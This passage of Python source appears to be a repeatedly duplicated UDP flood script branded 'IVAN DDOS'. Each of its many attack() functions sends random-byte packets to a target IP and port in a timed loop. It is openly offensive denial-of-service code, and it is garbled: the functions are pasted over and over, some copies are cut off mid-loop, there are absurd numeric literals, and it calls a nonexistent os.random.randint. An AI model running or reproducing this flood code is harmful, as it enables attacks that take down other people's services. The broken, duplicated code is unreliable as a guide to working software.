        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
